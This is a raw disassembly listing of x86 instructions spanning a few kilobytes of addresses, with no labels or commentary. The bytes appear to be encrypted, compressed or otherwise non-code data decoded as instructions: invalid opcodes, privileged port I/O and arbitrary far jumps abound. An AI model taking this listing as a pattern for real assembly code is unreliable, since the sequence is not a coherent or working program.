  414f94:	inc    edi
  414f95:	ror    bl,cl
  414f97:	mov    ecx,0x4a07fc9d
  414f9c:	mov    esi,0xb7b06bdf
  414fa1:	pop    ebx
  414fa2:	cmp    bl,BYTE PTR [esi]
  414fa4:	jmp    0xf640:0xc5d7fa13
  414fab:	hlt    
  414fac:	xchg   edx,eax
  414fad:	adc    al,0x91
  414faf:	out    0xc1,eax
  414fb1:	and    al,0xc8
  414fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb4:	pop    ebx
  414fb6:	icebp  
  414fb7:	fld    QWORD PTR [edi]
  414fb9:	xor    al,0x4
  414fbb:	pop    edx
  414fbc:	call   0x72a6:0x32d0aea0
  414fc3:	lods   al,BYTE PTR ds:[esi]
  414fc4:	pop    ss
  414fc5:	inc    edi
  414fc6:	data16 and BYTE PTR [eax+0x5a],0x95
  414fcb:	imul   esi,DWORD PTR [edi],0x79185a88
  414fd1:	inc    esp
  414fd2:	mov    ebx,0x2a105eea
  414fd7:	(bad)  
  414fd8:	cmp    DWORD PTR [eax],edi
  414fda:	pushf  
  414fdb:	pop    ebp
  414fdc:	imul   ebx,DWORD PTR [eax+0x1b],0xc0866c18
  414fe3:	lea    ecx,[esi+0x1f766b91]
  414fe9:	xor    eax,0xbb11af02
  414fee:	or     dl,0x6a
  414ff1:	stos   DWORD PTR es:[edi],eax
  414ff2:	mov    ch,0x58
  414ff4:	dec    edi
  414ff5:	dec    edi
  414ff6:	mov    bh,0x44
  414ff8:	popa   
  414ff9:	pusha  
  414ffa:	dec    eax
  414ffb:	dec    edx
  414ffc:	inc    ecx
  414ffd:	retf   
  414ffe:	fst    st(3)
  415000:	cmp    esi,edi
  415002:	loop   0x414f9f
  415004:	inc    edx
  415005:	fild   DWORD PTR [edi]
  415007:	sbb    eax,0xd068c084
  41500c:	adc    ebx,ebx
  41500e:	jo     0x414fab
  415010:	dec    ebx
  415011:	les    ebx,FWORD PTR [esi]
  415013:	lock xchg edi,eax
  415015:	(bad)  
  415016:	loope  0x41506d
  415018:	push   edi
  415019:	jmp    0x8b69:0xda649d0c
  415020:	mov    dl,0x7
  415022:	fsub   st,st(4)
  415024:	add    esi,DWORD PTR ds:0xd28b5a3f
  41502a:	loopne 0x415083
  41502c:	xchg   edx,eax
  41502d:	repz clc 
  41502f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  415031:	(bad)  
  415033:	pop    ebp
  415034:	dec    edi
  415035:	and    eax,0xe39477f3
  41503a:	mov    ebx,0xd84b6234
  41503f:	xchg   BYTE PTR [ebx+ecx*4],al
  415042:	lds    esi,FWORD PTR es:[esi-0x8843321]
  415049:	push   edx
  41504a:	cmp    eax,0x48ca3a7d
  41504f:	jae    0x414fdd
  415051:	and    esi,DWORD PTR [eax+0xa]
  415054:	dec    eax
  415055:	sahf   
  415056:	sbb    eax,0x230eedb
  41505b:	mov    cl,0x6a
  41505d:	dec    esp
  41505e:	repnz pop edx
  415060:	bound  ebp,QWORD PTR ds:0x5d65c3d1
  415066:	and    eax,0x68cd8726
  41506b:	pop    ebx
  41506c:	shl    dl,1
  41506e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506f:	bound  esi,QWORD PTR [eax-0x5c39e387]
  415075:	retf   
  415076:	in     al,dx
  415077:	adc    DWORD PTR [esi+0x65845e12],ebx
  41507d:	sub    BYTE PTR [ebx+0x29],ah
  415080:	xchg   edi,eax
  415081:	mov    WORD PTR [edi-0x55],ss
  415084:	inc    edi
  415085:	fisub  WORD PTR [ebx-0x16]
  415088:	and    DWORD PTR [edi-0x57f7b827],edi
  41508e:	mov    al,0xba
  415090:	dec    edi
  415091:	adc    eax,0x38dc4fce
  415096:	pop    edx
  415097:	sub    al,0x14
  415099:	retf   
  41509a:	mov    esp,0x37eb464d
  41509f:	add    esp,DWORD PTR [eax+esi*4]
  4150a2:	test   al,0x3e
  4150a4:	dec    edi
  4150a5:	in     eax,dx
  4150a6:	mov    edi,0x154099d6
  4150ab:	jno    0x41503a
  4150ad:	mov    bl,BYTE PTR [edi+0x67014b6e]
  4150b3:	test   ch,cl
  4150b5:	inc    esp
  4150b6:	mov    al,BYTE PTR [edx-0x2ad0ee8d]
  4150bc:	clc    
  4150bd:	fwait
  4150be:	xor    bl,dh
  4150c0:	fwait
  4150c1:	or     eax,0x363790c5
  4150c6:	pop    edi
  4150c7:	mov    ebx,0xaa1a1235
  4150cc:	inc    ebp
  4150cd:	and    al,0x61
  4150cf:	mov    DWORD PTR [ebp-0x4],ebx
  4150d2:	fmul   DWORD PTR [esi+0x14]
  4150d5:	and    BYTE PTR [edi],0x90
  4150d8:	push   ds
  4150d9:	adc    BYTE PTR [ebx+0x2d7610e3],0x70
  4150e0:	jle    0x4150ba
  4150e2:	ss xchg esi,eax
  4150e4:	cmc    
  4150e5:	lahf   
  4150e6:	or     BYTE PTR [ebp+eax*2+0x62],cl
  4150ea:	mov    ah,0x25
  4150ec:	in     eax,dx
  4150ed:	push   0x280ff6b5
  4150f2:	or     cl,dh
  4150f4:	or     BYTE PTR [edi+0x29325ff9],0x4f
  4150fb:	push   ebx
  4150fc:	add    al,0xdb
  4150fe:	mov    edi,0x36a05962
  415103:	adc    ebx,DWORD PTR [esi+0xc]
  415106:	sbb    esi,DWORD PTR [ebx]
  415108:	cmp    ebp,edx
  41510a:	fiadd  WORD PTR [ecx+ebx*8]
  41510d:	test   BYTE PTR [edx],al
  41510f:	(bad)
  415112:	or     esi,DWORD PTR [ebx]
  415114:	ret    0xbbc8
  415117:	xchg   esi,eax
  415118:	xor    ecx,DWORD PTR [edi+0x52]
  41511b:	or     ebx,esp
  41511d:	mov    ds:0xf67dde39,eax
  415122:	bound  edi,QWORD PTR [edi+ebx*8]
  415125:	int    0xd6
  415127:	push   es
  415128:	cs jg  0x4151a3
  41512b:	ja     0x4150d1
  41512d:	cmp    ebp,ebx
  41512f:	sbb    ebp,edx
  415131:	sub    BYTE PTR ds:0x73e9e906,0x39
  415138:	jnp    0x415168
  41513a:	jle    0x41518c
  41513c:	dec    ebx
  41513d:	add    dl,BYTE PTR es:[ecx+0x246f6878]
  415144:	cmc    
  415145:	xor    ebp,eax
  415147:	fcomp  DWORD PTR [eax]
  415149:	arpl   WORD PTR ds:0x417f6b67,cx
  41514f:	mov    bl,BYTE PTR [ecx+edx*1+0x74]
  415153:	dec    esp
  415154:	push   esp
  415155:	cs or  al,0xeb
  415158:	loop   0x4150ea
  41515a:	sub    BYTE PTR [esi-0x15159a23],bl
  415160:	mul    DWORD PTR [edx-0xe]
  415163:	pushf  
  415164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415165:	sbb    al,0x15
  415167:	add    eax,0x4bbf3ed8
  41516c:	jns    0x415124
  41516e:	or     al,0x1
  415170:	sub    BYTE PTR [ecx+edi*8],bh
  415173:	dec    esi
  415174:	mov    eax,ds:0x5321f2fb
  415179:	outs   dx,BYTE PTR ds:[esi]
  41517a:	call   0x44766dc6
  41517f:	push   eax
  415180:	call   0x122d:0xaa9bb64f
  415187:	jae    0x415165
  415189:	xor    dl,dh
  41518b:	dec    ebp
  41518c:	fwait
  41518d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518e:	xchg   ebx,eax
  41518f:	enter  0x64e9,0xc3
  415193:	jmp    0x9c07c4cc
  415198:	jmp    0x415154
  41519a:	sub    BYTE PTR [esi],0xf7
  41519d:	test   DWORD PTR [eax+0x70],esi
  4151a0:	mov    eax,0xe9f43eb7
  4151a5:	sub    dl,BYTE PTR [ebp+0x2c51b5c9]
  4151ab:	mov    edi,0xfa505e80
  4151b0:	adc    al,0xc8
  4151b2:	ror    DWORD PTR [esi+0x12],cl
  4151b5:	jl     0x415214
  4151b7:	jne    0x4151ef
  4151b9:	iret   
  4151ba:	jns    0x4151c5
  4151bc:	inc    ebx
  4151bd:	pop    es
  4151be:	call   0x6f41:0x5faf76df
  4151c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151c6:	adc    eax,ecx
  4151c8:	add    DWORD PTR [ecx-0x6b],eax
  4151cb:	clc    
  4151cc:	hlt    
  4151cd:	mov    dh,0x83
  4151cf:	cmp    eax,0x51fce0ec
  4151d4:	dec    ebp
  4151d5:	fsub   DWORD PTR [ecx+0x42]
  4151d8:	ins    BYTE PTR es:[edi],dx
  4151d9:	push   ebp
  4151da:	push   esp
  4151db:	sbb    bl,BYTE PTR [edx]
  4151dd:	xor    ebp,DWORD PTR fs:[ebp+ecx*4-0x2a]
  4151e2:	add    eax,0xa8fab88a
  4151e7:	in     eax,0x17
  4151e9:	push   es
  4151ea:	and    esi,edi
  4151ec:	and    DWORD PTR [ebp-0xb],ebx
  4151ef:	pushf  
  4151f0:	lods   eax,DWORD PTR ds:[esi]
  4151f1:	adc    DWORD PTR [esi-0x5e],ebp
  4151f4:	mov    al,ds:0xc7370e25
  4151f9:	sbb    BYTE PTR [edi-0x51],bl
  4151fc:	dec    ebx
  4151fd:	cli    
  4151fe:	iret   
  4151ff:	imul   eax,DWORD PTR [edx+edi*2],0xffffffaf
  415203:	pusha  
  415204:	pop    es
  415205:	in     al,dx
  415206:	mov    dh,0xda
  415208:	dec    ebx
  415209:	inc    edx
  41520a:	xchg   esi,eax
  41520b:	xchg   esi,eax
  41520c:	or     BYTE PTR [ebp-0x32],bh
  41520f:	add    ch,ah
  415211:	loope  0x4151d0
  415213:	pop    ebx
  415214:	lock call 0xe6b7:0x50b6dc99
  41521c:	mov    cl,0xd6
  41521e:	test   al,0x10
  415220:	pop    ebp
  415221:	shl    al,1
  415223:	adc    ecx,DWORD PTR [ecx+0x565a0034]
  415229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41522a:	out    0xf0,al
  41522c:	dec    edx
  41522d:	hlt    
  41522e:	cmc    
  41522f:	fnstenv [esi+eax*8]
  415232:	sub    DWORD PTR [edi-0x76af7d2c],ebx
  415238:	pop    es
  415239:	jle    0x415223
  41523b:	cli    
  41523c:	push   edi
  41523d:	js     0x41524f
  41523f:	daa    
  415240:	cdq    
  415241:	dec    edx
  415242:	int    0x91
  415244:	add    al,BYTE PTR [edi]
  415246:	xchg   ebx,eax
  415247:	inc    edx
  415248:	inc    esi
  415249:	mov    al,BYTE PTR [edi+0x5a]
  41524c:	mov    gs,eax
  41524e:	retf   0x6e8a
  415251:	add    esi,0x7e339e08
  415257:	jnp    0x4152a8
  415259:	test   BYTE PTR [ebx+edi*1+0x53],dh
  41525d:	jne    0x415274
  41525f:	sti    
  415260:	es push edx
  415262:	dec    edi
  415263:	push   edi
  415264:	mov    dl,0xe1
  415266:	mov    cl,BYTE PTR [eax]
  415268:	aam    0xc8
  41526a:	aas    
  41526b:	das    
  41526c:	int    0x91
  41526e:	popa   
  41526f:	les    edx,FWORD PTR [eax]
  415271:	(bad)
  415274:	sub    al,0x28
  415276:	mov    esp,0x7c6526de
  41527b:	in     al,0x3c
  41527d:	jne    0x41524c
  41527f:	stos   BYTE PTR es:[edi],al
  415280:	push   cs
  415281:	push   ebx
  415282:	pop    edi
  415283:	xchg   edi,eax
  415284:	adc    DWORD PTR [eax+edi*1+0x6e108923],esp
  41528b:	jnp    0x41521d
  41528d:	inc    edi
  41528e:	mov    al,ds:0xa122d2f0
  415293:	and    DWORD PTR [ebp+0x56],ebx
  415296:	ins    DWORD PTR es:[edi],dx
  415297:	or     al,0x83
  415299:	std    
  41529a:	jno    0x415291
  41529c:	jae    0x41530a
  41529e:	gs (bad) 
  4152a0:	(bad)  
  4152a1:	stos   DWORD PTR es:[edi],eax
  4152a2:	adc    eax,0xef6a31b
  4152a7:	mov    fs,WORD PTR [ebp+ebx*1-0x4fed5c4a]
  4152ae:	xor    DWORD PTR [edx-0x36e3c35c],ebx
  4152b4:	jmp    0x5584:0x3275
  4152ba:	jne    0x4152d4
  4152bc:	sbb    bl,BYTE PTR [edx]
  4152be:	arpl   WORD PTR [eax],ax
  4152c0:	mov    bh,0x49
  4152c2:	and    BYTE PTR [ebp+0x28],0xf
  4152c6:	mov    ch,BYTE PTR [ebx+ecx*1]
  4152c9:	sar    DWORD PTR [esi+0x2a],0x3b
  4152cd:	and    BYTE PTR [edx-0x56],dh
  4152d0:	jae    0x415272
  4152d2:	mov    edi,0xcd1bb32d
  4152d7:	pop    edx
  4152d8:	jl     0x415271
  4152da:	sbb    eax,0x67e5f2f9
  4152df:	rol    BYTE PTR [ebx+0x49cd31ce],1
  4152e5:	sub    BYTE PTR [edi+0x70],bh
  4152e8:	xchg   edi,eax
  4152e9:	inc    edi
  4152ea:	mov    DWORD PTR es:[ecx],ecx
  4152ed:	sub    edx,DWORD PTR [eax+0x76dbc2ff]
  4152f3:	outs   dx,BYTE PTR ds:[esi]
  4152f4:	imul   eax,edi,0x72
  4152f7:	popf   
  4152f8:	(bad)  
  4152f9:	stc    
  4152fa:	jl     0x4152b4
  4152fc:	stos   DWORD PTR es:[edi],eax
  4152fd:	jmp    0x9155:0x4f4c7536
  415304:	xchg   DWORD PTR [edx-0x4c],esi
  415307:	push   ecx
  415308:	xchg   ecx,eax
  415309:	mov    ds:0x69a348f5,al
  41530e:	jmp    0x415310
  415310:	and    BYTE PTR [ecx+ebp*8+0x5458aa41],al
  415317:	scas   al,BYTE PTR es:[edi]
  415318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415319:	mov    cl,0x3b
  41531b:	adc    BYTE PTR [eax],ch
  41531d:	or     BYTE PTR [edx+0x63],ch
  415320:	push   ss
  415321:	test   BYTE PTR [ecx+0x4a4bc765],bh
  415327:	sbb    ah,BYTE PTR [eiz*1-0x61dda468]
  41532e:	fidivr WORD PTR [eax+0x3f217e68]
  415334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415335:	mov    ds:0xae3546b,eax
  41533a:	retf   0xc3f8
  41533d:	inc    eax
  41533e:	loop   0x41535e
  415340:	out    dx,al
  415341:	icebp  
  415342:	dec    DWORD PTR [ecx+ebp*8]
  415345:	xchg   edx,eax
  415346:	jno    0x415337
  415348:	rcl    dl,0x80
  41534b:	fnsave [edx+0x500e94dc]
  415351:	pop    edi
  415352:	push   ecx
  415353:	xchg   esp,eax
  415354:	sub    DWORD PTR [ebx+0x7ed27d92],edx
  41535a:	mov    ds:0x442ddc8a,eax
  41535f:	xchg   ecx,eax
  415360:	push   es
  415361:	mov    eax,ds:0x4a478ce
  415366:	add    BYTE PTR [eax+ebx*2],ah
  415369:	scas   eax,DWORD PTR es:[edi]
  41536a:	jp     0x4153de
  41536c:	mov    al,ds:0xc0de1426
  415371:	xchg   ebx,eax
  415372:	sbb    bh,dh
  415374:	sub    eax,0x5dc11cc3
  415379:	pop    ecx
  41537a:	sahf   
  41537b:	jp     0x415334
  41537d:	and    edx,DWORD PTR ds:0xe57da60f
  415383:	pop    es
  415384:	sub    ebp,ecx
  415386:	imul   ebx,DWORD PTR [esi],0x5f
  415389:	(bad)  
  41538a:	scas   eax,DWORD PTR es:[edi]
  41538b:	and    BYTE PTR [esi+eiz*1],0xeb
  41538f:	jmp    0x4153bc
  415391:	dec    eax
  415392:	xor    DWORD PTR [ecx+eax*8-0x1685e2b9],edi
  415399:	fs pop ss
  41539b:	fbstp  TBYTE PTR [ebp+edx*4+0x43]
  41539f:	cld    
  4153a0:	xor    BYTE PTR [ecx-0x71],al
  4153a3:	or     al,0x5a
  4153a5:	adc    DWORD PTR ds:0xee6c4ac5,edi
  4153ab:	ins    BYTE PTR es:[edi],dx
  4153ac:	jmp    0xaf3b:0xe93ab5e0
  4153b3:	dec    edx
  4153b4:	repz inc ecx
  4153b6:	inc    edx
  4153b7:	dec    ecx
  4153b8:	mov    dh,0x39
  4153ba:	cmc    
  4153bb:	call   0x23203012
  4153c0:	rcr    al,1
  4153c2:	sbb    bl,dl
  4153c4:	stc    
  4153c5:	mov    ds:0x6b2e927e,al
  4153ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153cb:	div    DWORD PTR [ebx]
  4153cd:	mov    ds:0x48147f06,al
  4153d2:	mov    ecx,0x8a4a97cd
  4153d7:	fdiv   QWORD PTR [ebp+ebp*2+0xd]
  4153db:	fsub   st,st(3)
  4153dd:	pop    ss
  4153de:	adc    BYTE PTR [eax],0x1
  4153e1:	pop    es
  4153e2:	mov    dl,0xf7
  4153e4:	enter  0xf3b2,0xc8
  4153e8:	out    0xe6,eax
  4153ea:	xlat   BYTE PTR ds:[ebx]
  4153eb:	cmp    DWORD PTR [eax-0x5f],0x4d23f1cc
  4153f2:	mov    edx,0x1f09ee3a
  4153f7:	mov    esp,0x401dff56
  4153fc:	nop
  4153fd:	sbb    DWORD PTR [eax-0x27],eax
  415400:	in     eax,dx
  415401:	js     0x41547e
  415403:	sub    edi,DWORD PTR [ecx-0x3e]
  415406:	mov    bl,0xc
  415408:	dec    esi
  415409:	jl     0x415477
  41540b:	test   eax,0x14996395
  415410:	jmp    0x77d418bf
  415415:	xchg   esi,eax
  415416:	aas    
  415417:	inc    ebp
  415418:	(bad)  
  415419:	sub    al,0xe6
  41541b:	and    di,WORD PTR cs:[ecx-0x69e8a639]
  415423:	cmp    BYTE PTR [esi],cl
  415425:	loopne 0x4153ac
  415427:	sbb    eax,0x185f8389
  41542c:	dec    ecx
  41542d:	cli    
  41542e:	test   DWORD PTR [edi],esi
  415430:	mov    edi,0x2842caa8
  415435:	ret    0x1d07
  415438:	stos   DWORD PTR es:[edi],eax
  415439:	(bad)  
  41543a:	out    dx,al
  41543b:	mov    ds:0x4838b227,eax
  415440:	or     dh,BYTE PTR [esi]
  415442:	ret    
  415443:	adc    DWORD PTR [ebx-0x68a8efaa],0x949ce900
  41544d:	pop    ecx
  41544e:	fsub   QWORD PTR ds:0x566e6d9a
  415454:	ins    BYTE PTR es:[edi],dx
  415455:	xchg   ebp,eax
  415456:	fstp   TBYTE PTR [ecx]
  415458:	fidiv  DWORD PTR ds:0x6b249b02
  41545e:	add    ah,BYTE PTR [ecx-0x3f85497f]
  415464:	bound  ebx,QWORD PTR [ecx-0x72fd3881]
  41546a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41546b:	mov    DWORD PTR [ecx-0x5cf6e2c1],esi
  415471:	xchg   BYTE PTR [ebp-0x7e],bh
  415474:	and    eax,0xa31557c
  415479:	leave  
  41547a:	xchg   edi,eax
  41547b:	ror    BYTE PTR ds:0xed8b5a2d,1
  415481:	(bad)  
  415482:	in     al,0xd
  415484:	retf   0x9e81
  415487:	and    bh,BYTE PTR [ebp-0x3b]
  41548a:	inc    edx
  41548b:	clc    
  41548c:	int    0x56
  41548e:	pmaddwd mm1,QWORD PTR ss:[eax+0x74c3fb57]
  415496:	cmc    
  415497:	add    edi,DWORD PTR [esi]
  415499:	fsub   DWORD PTR [edi-0x5a]
  41549c:	xlat   BYTE PTR ds:[ebx]
  41549d:	mov    bh,0x2c
  41549f:	stc    
  4154a0:	mov    ebp,DWORD PTR [ebp+0x7]
  4154a3:	mov    esp,eax
  4154a5:	shl    DWORD PTR es:[edi+0x5b],cl
  4154a9:	fs fwait
  4154ab:	ja     0x4154d3
  4154ad:	outs   dx,BYTE PTR ds:[esi]
  4154ae:	ja     0x415437
  4154b0:	test   DWORD PTR [edi-0x423d13cf],edi
  4154b6:	sbb    dh,BYTE PTR [ebx+ebx*8]
  4154b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ba:	or     eax,0x53ce27c7
  4154bf:	gs xchg ebp,eax
  4154c1:	or     eax,0x3794e109
  4154c6:	jecxz  0x415544
  4154c8:	sub    al,0x2b
  4154ca:	ins    DWORD PTR es:[edi],dx
  4154cb:	lds    esp,FWORD PTR [eax-0x42]
  4154ce:	mov    eax,0xafde3153
  4154d3:	gs aad 0x63
  4154d6:	adc    ah,ch
  4154d8:	iret   
  4154d9:	adc    DWORD PTR [esi-0xb],esp
  4154dc:	jo     0x4154d6
  4154de:	mov    edx,0xe86e9461
  4154e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154e4:	std    
  4154e5:	sbb    DWORD PTR ds:0xcdc39221,edi
  4154eb:	stc    
  4154ec:	test   al,0xdd
  4154ee:	push   ss
  4154ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154f0:	psrld  mm1,QWORD PTR [ecx]
  4154f3:	xlat   BYTE PTR ss:[ebx]
  4154f5:	das    
  4154f6:	xchg   edi,eax
  4154f7:	mov    DWORD PTR [eax-0x77],ebx
  4154fa:	ja     0x41547c
  4154fc:	mov    esi,0x91cc1e66
  415501:	sub    DWORD PTR [esi-0x29ee41c8],esp
  415507:	pop    edi
  415508:	pushf  
  415509:	mul    BYTE PTR [ebx]
  41550b:	mov    ds:0x18c37b96,eax
  415510:	ret    0x4605
  415513:	and    eax,0x8a0c000b
  415518:	sbb    BYTE PTR [eax],ah
  41551a:	dec    ecx
  41551b:	js     0x41557a
  41551d:	pop    ebx
  41551e:	mov    ebx,0x5cfc68a9
  415523:	mov    ch,BYTE PTR [eax+0x5e7c812d]
  415529:	lods   eax,DWORD PTR ds:[esi]
  41552a:	push   es
  41552b:	loope  0x4155a2
  41552d:	inc    esi
  41552e:	shl    BYTE PTR [edi-0x14f905e0],0x80
  415535:	clc    
  415536:	pusha  
  415537:	retf   
  415538:	mov    eax,0x1c2b544e
  41553d:	adc    esp,ebx
  41553f:	xor    BYTE PTR [edi+ebx*2+0x725388c],0x57
  415547:	inc    ebp
  415548:	fwait
  415549:	mov    ch,0x92
  41554b:	mov    edi,0x1e1ed93b
  415550:	cmp    al,0x6a
  415552:	push   esi
  415553:	xchg   ebx,eax
  415554:	mov    edi,0xf62ad965
  415559:	into   
  41555a:	xor    BYTE PTR [edi+0x6684ae64],cl
  415560:	push   ebp
  415561:	daa    
  415562:	fnstcw WORD PTR [ebp+0x5e137ed5]
  415568:	sbb    ecx,DWORD PTR [ecx-0x641a581]
  41556e:	imul   eax,DWORD PTR ds:0xf59d74b0,0x62fe578c
  415578:	xchg   ebp,eax
  415579:	and    ebp,ebx
  41557b:	outs   dx,BYTE PTR ds:[esi]
  41557c:	imul   ecx,DWORD PTR [esi+0x6c3b7d5f],0x59
  415583:	cmc    
  415584:	ins    DWORD PTR es:[edi],dx
  415585:	(bad)  
  415586:	in     eax,0xed
  415588:	clc    
  415589:	inc    edi
  41558a:	aas    
  41558b:	pop    edi
  41558c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558d:	int3   
  41558e:	mov    WORD PTR [esp+ebx*2-0xe],gs
  415592:	ja     0x41560c
  415594:	shl    BYTE PTR [edi],0x77
  415597:	mov    esp,0x856ded17
  41559c:	repz adc eax,0xa61fa333
  4155a2:	adc    cl,BYTE PTR [esi-0x13]
  4155a5:	add    esi,ecx
  4155a7:	add    eax,0x25f9361d
  4155ac:	mov    ah,BYTE PTR [edi]
  4155ae:	nop
  4155af:	pop    esi
  4155b0:	loope  0x415564
  4155b2:	rcr    BYTE PTR [eax+0x89663c2],cl
  4155b8:	add    DWORD PTR [edi+edx*8-0x27],0xd0c1c81a
  4155c0:	sub    eax,0xac0186f9
  4155c5:	daa    
  4155c6:	cwde   
  4155c7:	aam    0x42
  4155c9:	mov    ds:0x7ac1806,eax
  4155ce:	jmp    0x4155cf
  4155d0:	push   ebx
  4155d1:	add    DWORD PTR [ebp-0x78],0x18
  4155d5:	push   ebp
  4155d6:	mov    cl,0xb5
  4155d8:	out    dx,eax
  4155d9:	mov    ch,0xd2
  4155db:	pop    ss
  4155dc:	push   edx
  4155dd:	jmp    0xcf6bafaf
  4155e2:	add    edi,DWORD PTR ds:0x66f87937
  4155e8:	idiv   DWORD PTR [ebp+edx*1-0x4]
  4155ec:	fs das 
  4155ee:	jp     0x4155ff
  4155f0:	outs   dx,BYTE PTR ds:[esi]
  4155f1:	sbb    al,BYTE PTR [edx+0x3e]
  4155f4:	test   BYTE PTR [edi+0x63],bh
  4155f7:	fwait
  4155f8:	sbb    ebx,DWORD PTR [edx-0x79]
  4155fb:	nop
  4155fc:	js     0x415662
  4155fe:	out    0x5,eax
  415600:	xor    BYTE PTR [ecx-0x21],cl
  415603:	fistp  WORD PTR ss:[eax-0x154c29f]
  41560a:	test   eax,0xd77cd2db
  41560f:	inc    edx
  415610:	addr16 xchg esi,eax
  415612:	shl    DWORD PTR [ebx+esi*2+0x653d2867],cl
  415619:	fldcw  WORD PTR [esp+eax*1+0x45]
  41561d:	or     dl,BYTE PTR [edi+0x76bf039c]
  415623:	mov    ecx,DWORD PTR [ebp+0x76155c5c]
  415629:	sbb    dl,BYTE PTR [ecx*4-0x7be5f6cd]
  415630:	inc    ebp
  415631:	cvtdq2ps xmm1,xmm3
  415634:	ss adc esp,ecx
  415637:	pop    es
  415638:	xor    DWORD PTR ds:0xe70fae36,0x621313d6
  415642:	shl    BYTE PTR [edi-0x3251ff3c],1
  415648:	inc    ebp
  415649:	or     al,cl
  41564b:	inc    esp
  41564c:	imul   edx,DWORD PTR [esi],0x530624ae
  415652:	je     0x4155e1
  415654:	sbb    eax,0xb95c0cfe
  415659:	sbb    esp,DWORD PTR [edx-0x19]
  41565c:	das    
  41565d:	inc    eax
  41565e:	mov    bh,0x2d
  415660:	xchg   edi,eax
  415661:	pop    ecx
  415662:	in     al,0xf9
  415664:	xor    BYTE PTR [eax-0x438f1d8f],0x59
  41566b:	arpl   WORD PTR [esi],di
  41566d:	pop    ebx
  41566e:	out    dx,al
  41566f:	ret    0x37ae
  415672:	out    0xa6,al
  415674:	inc    BYTE PTR [edi-0x71]
  415677:	sbb    BYTE PTR [edx-0x41],0x64
  41567b:	push   es
  41567c:	ret    
  41567d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41567e:	xor    bh,BYTE PTR [esi+0x7d]
  415681:	cld    
  415682:	in     eax,dx
  415683:	inc    esi
  415684:	fdiv   QWORD PTR [ecx]
  415686:	cmp    eax,DWORD PTR [ebp-0x48]
  415689:	ja     0x4156cb
  41568b:	mov    ds:0xfbadcce1,al
  415690:	mov    cl,0xf6
  415692:	inc    ecx
  415693:	dec    edx
  415694:	into   
  415695:	(bad)  [ebx]
  415697:	ins    BYTE PTR es:[edi],dx
  415698:	in     eax,0x6e
  41569a:	out    dx,eax
  41569b:	js     0x4156bd
  41569d:	daa    
  41569e:	inc    eax
  41569f:	pop    esi
  4156a0:	test   DWORD PTR [esi],edx
  4156a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a3:	test   ax,0xbb56
  4156a8:	inc    eax
  4156a9:	(bad)  
  4156aa:	cli    
  4156ab:	int3   
  4156ac:	pop    esp
  4156ad:	retf   0xefc2
  4156b0:	xchg   ebp,eax
  4156b1:	sbb    DWORD PTR [ecx+ebp*8],edx
  4156b4:	mov    ebx,0xa0e412fa
  4156b9:	scas   eax,DWORD PTR es:[edi]
  4156ba:	inc    BYTE PTR fs:[eax+0x6816bd5b]
  4156c1:	out    0xf0,al
  4156c3:	sub    eax,0x8c957283
  4156c8:	pop    esi
  4156c9:	scas   eax,DWORD PTR es:[edi]
  4156ca:	repz lds esp,FWORD PTR [edi]
  4156cd:	(bad)  
  4156ce:	lock lods al,BYTE PTR ds:[esi]
  4156d0:	mov    ah,BYTE PTR [ebp+edx*2-0x6f]
  4156d4:	adc    BYTE PTR [eax],dl
  4156d6:	es or  al,0xa3
  4156d9:	shl    BYTE PTR [edx-0x24a9150d],0x4f
  4156e0:	jno    0x4156ef
  4156e2:	sahf   
  4156e3:	shl    BYTE PTR [edx],cl
  4156e5:	out    0x5e,eax
  4156e7:	inc    ecx
  4156e8:	das    
  4156e9:	or     DWORD PTR ds:0x17190a8d,0x3f0a4387
  4156f3:	sbb    al,0x1b
  4156f5:	popf   
  4156f6:	sub    DWORD PTR [esi],eax
  4156f8:	sub    dh,BYTE PTR [eax+0x3f]
  4156fb:	call   0x480b:0x29f9a443
  415702:	nop
  415703:	jno    0x415730
  415705:	pop    ebx
  415706:	xchg   esp,eax
  415707:	(bad)  
  415708:	aas    
  415709:	sbb    cl,bl
  41570b:	cmp    DWORD PTR [edi-0x50b15377],edx
  415711:	adc    eax,0xbc5bc131
  415716:	push   es
  415717:	and    ch,al
  415719:	fidivr WORD PTR [edx]
  41571b:	pop    ebx
  41571c:	jae    0x41578e
  41571e:	mov    esi,0x2268fcb6
  415723:	adc    al,0x16
  415725:	and    dl,bh
  415727:	(bad)  [edx-0x77]
  41572a:	cs dec ecx
  41572c:	dec    eax
  41572d:	ret    0xd94a
  415730:	adc    al,bh
  415732:	jno    0x415789
  415734:	adc    BYTE PTR [ecx+ebp*4-0x5a],dl
  415738:	outs   dx,DWORD PTR ds:[esi]
  415739:	ss adc ebx,esi
  41573c:	and    esi,ecx
  41573e:	ins    DWORD PTR es:[edi],dx
  41573f:	push   cs
  415740:	lahf   
  415741:	inc    ebp
  415742:	into   
  415743:	mov    ebp,0xe8b14e65
  415748:	inc    ecx
  415749:	(bad)  
  41574a:	ja     0x415701
  41574c:	sar    eax,1
  41574e:	xor    al,0xfa
  415750:	idiv   esp
  415752:	popf   
  415753:	aam    0xa
  415755:	xchg   ebp,eax
  415756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415757:	xchg   ebx,eax
  415758:	sar    ah,1
  41575a:	adc    esp,0xffffffb9
  41575d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41575e:	and    DWORD PTR ds:0xd4083933,0x71be9876
  415768:	or     BYTE PTR [ecx+ecx*4+0x7b88715b],0x6a
  415770:	aam    0x98
  415772:	(bad)  
  415773:	sub    eax,ebx
  415775:	(bad)  
